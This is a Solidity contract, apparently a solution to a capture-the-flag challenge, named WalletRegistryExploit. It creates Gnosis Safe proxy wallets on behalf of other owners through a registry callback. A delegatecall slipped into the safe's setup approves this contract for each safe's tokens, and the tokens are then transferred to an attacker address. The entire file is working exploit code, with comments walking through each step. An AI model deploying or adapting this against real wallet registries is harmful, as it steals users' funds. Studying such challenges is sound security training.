// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract WalletRegistryExploit {
    
    GnosisSafeProxyFactory private proxyFactory;// = ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address private masterCopyAddress;// = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;
    address[] private ownersToImpersonate;
    address private walletRegistryAddress;
    address private attacker;
    address private token;


    constructor(address _masterCopyAddress, address walletFactoryAddress, address[] memory _ownerToImpersonate, address _walletRegistryAddress, address _attacker, address _tokenAddress) {
        proxyFactory = GnosisSafeProxyFactory(walletFactoryAddress);
        masterCopyAddress = _masterCopyAddress;
        ownersToImpersonate = _ownerToImpersonate;
        walletRegistryAddress = _walletRegistryAddress;
        attacker = _attacker;
        token = _tokenAddress;
    }


    //delegate-call-method for the safe right after creation
    function delegatePwn(address _token, address _contract) external {
        IERC20(_token).approve(_contract, 10 ether);
    }


    function pwn() public {
        for(uint i = 0; i < ownersToImpersonate.length; i++ ){
            
            address[] memory owners = new address[](1);
            owners[0] = ownersToImpersonate[i];

            //The callback that will enable us to transfer the funds
            bytes memory delegate= abi.encodeWithSignature("delegatePwn(address,address)", token, address(this));

            //Setup safe in a way that e.g. Alice is the owner, but the safe sets an 10 eth-allowance to this contract 
            //for the token in its delegate call right after creation
            bytes memory proxyInitData = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this),  //to-address for delegatecall
                delegate,       //calldata bytes for delegatecall
                address(0x0),   //fallbackHandler - no need
                address(0x0),   //paymentToken (0 is ETH)
                0,              //value
                address(0x0)    //paymentReceiver
            );
            
            //Create safe-proxy with callback to the registry to get the funds into the safe
            GnosisSafeProxy proxy = proxyFactory.createProxyWithCallback(
                masterCopyAddress,
                proxyInitData,
                i,
                IProxyCreationCallback(walletRegistryAddress)
            );

            //Transfer from safe to attacker
            IERC20(token).transferFrom(address(proxy), attacker, 10 ether);
            }
        }
}
